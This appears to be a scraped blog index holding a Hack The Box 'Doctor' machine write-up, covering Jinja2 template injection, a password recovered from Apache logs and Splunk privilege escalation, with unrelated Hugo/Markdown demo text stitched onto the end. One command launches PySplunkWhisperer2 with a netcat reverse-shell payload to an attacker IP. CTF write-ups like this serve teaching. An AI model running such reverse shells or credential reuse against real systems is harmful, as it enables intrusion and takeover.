Here, we have several possibilities. View and update our account - nothing suspicious there Logout - obviously not suspicious as well Create New Posts As we know from the original doctor web application, there was a user called “Admin” that posted some Blog articles. Let’s see if we can figure something out: When creating a new post, it asks us for a title and some content. Afterwards, a nice post gets generated and we can view it on our posts list. My first idea was to enumerate for users in the url, as a directory was created for my username babbadeckl. But we can also try the admin user, as we know that he/she published some posts. However, the post did not reveal any helpful information. Then I remebered a similar challenge which I solved during a CTF a few weeks earlier. The task was to steal the Admin cookie to then impersonate his/her account. The assumption here is, of course, that the admin user will open/look at the posts that I generate. So… I tried to somehow find that XSS vulnerability… But apparently that’s not the correct way for this challenge. After several hours of reaching dead ends, I discovered a directory called archive. At first glance it’s simply a blank website, but opening the source code it reveals an HTML item: \r\u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e\r\u003crss version=\"2.0\"\u003e\r\u003cchannel\u003e\r\u003ctitle\u003eArchive\u003c/title\u003e\r\u003citem\u003e\u003ctitle\u003etest\u003c/title\u003e\u003c/item\u003e\r\u003c/channel\u003e\rIt contained an item with a title element set to test … hmm is that the title from our post? I went back to creating a post with the title 1234. When reloading the archive source code the item title changed to 1234. So I was able to control that! That seems suspicious. I immediately thought of some kind of injection vulnerability. What is it? Command Injection? Some language in the background that’s interpreting my input? Then I remebered a security lab from my university in which we talked about Modern Web Application Exploitation. The big topic there was Sever Side Template Injection (SSTI). I tried the basic payloads and indeed! It’s vulnerable to SSTI. I will quickly show you how you can test for SSTI and then identify the underlying template engine. We simply follow the identification graph in the picture above.

Amazing. Now we only have to find out wheather it’s Twig or Jinja2.

E.g: {{7*'7'}} will result in 49 for Twig and 7777777 for Jinja2. Let’s test for that payload!

The __subclasses__ attribute is defined as a method that “keeps a list of weak references to its immediate subclasses.” for each new-style class, and “returns a list of all those references still alive.” Greatly simplified, __mro__ allows us to go back up the tree of inherited objects in the current Python environment, and __subclasses__ lets us come back down. So what’s the impact on the search for a greater exploit for SSTI in Flask/Jinja2? By starting with a new-type object, e.g. type str, we can crawl up the inheritance tree to the root object class using __mro__, then crawl back down to every new-style object in the Python environment using __subclasses__.

That’s what I wanted to check even more than doing the token thingy. And indeed! We have access to the apache2 logs. More specifically, there is a logfile called backups. It contains tons of server requests but one is really interesting. 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \"POST /reset_password?email=Guitar12\r3\" 500 453 \"http://doctor.htb/reset_password\"\rSomebody requested a password reset with an email parameter set to Guitar123. That’s weird. Especially because the route does not even exist. So what could it be? For someone who regularly presses TAB for switching login fields, this might look familiar. What if the user actually wanted to enter the password but pressed TAB too often and landed in the URL where he/she then typed the password and pressed ENTER? I wanted to try if that’s the password for a user on the machine. I went into the /home directory and checked for existing users. Shaun is the only one besides our current user web. I typed su shaun\rPassword: Guitar123\rAmazing! It works! We now have access to user shaun shaun@doctor:/var/log/apache2$ hostname \u0026\u0026 whoami \u0026\u0026 id\rdoctor\rshaun\ruid=1002(shaun) gid=1002(shaun) groups=1002(shaun)\r","date":"2020-12-01","objectID":"/wiretups/doctor-machine/:4:0","tags":["Hackthebox"],"title":"Doctor machine","uri":"/wiretups/doctor-machine/"},{"categories":null,"content":"Privilege Escalation Final step is to obtain a root shell. After another round of going through all the common privilege escalation techniques, I was again pretty stuck, until I took a look at the /etc/passwd file. shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash\rsplunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash\rOf course! We still have the open Splunk Service on the original IP address. And now that we have a user shell we can also use a tool that’s known for Splunk Privilege Escalation (https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2). Problem is that the authorization fails with default credentials… But after some tries, I quickly figured them out: they are the same credentials as our current user shaun:Guitar123. Now we can use the tool to create an App for us (with user specified payload). But don’t forget to set up your nc listener! python3 exploit.py --username=\"shaun\" --password=\"Guitar123\" --payload='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.26 5555 \u003e/tmp/f' --payload-file='pwn.sh'\r(Exploit.py is the PySplunkWhisperer2_local.py, but I renamed it for convenience.) And we obtain a root shell! We pwned the machine.

To avoid this limitations, Hugo created shortcodes. A shortcode is a simple snippet that can generate reasonable HTML code and conforms to Markdown’s design philosophy. Hugo ships with a set of predefined shortcodes that represent very common usage. These shortcodes are provided for author convenience and to keep your markdown content clean.

Note This article is a shameful copy of the great Grav original page. If you want to know about the extended Markdown syntax of LoveIt theme, please read extended Markdown syntax page. Let’s face it: Writing content for the Web is tiresome. WYSIWYG editors help alleviate this task, but they generally result in horrible code, or worse yet, ugly web pages. Markdown is a better way to write HTML, without all the complexities and ugliness that usually accompanies it. Some of the key benefits are: Markdown is simple to learn, with minimal extra characters, so it’s also quicker to write content. Less chance of errors when writing in Markdown. Produces valid XHTML output. Keeps the content and the visual display separate, so you cannot mess up the look of your site. Write in any text editor or Markdown application you like. Markdown is a joy to use! John Gruber, the author of Markdown, puts it like this: The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email. – John Gruber Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like!
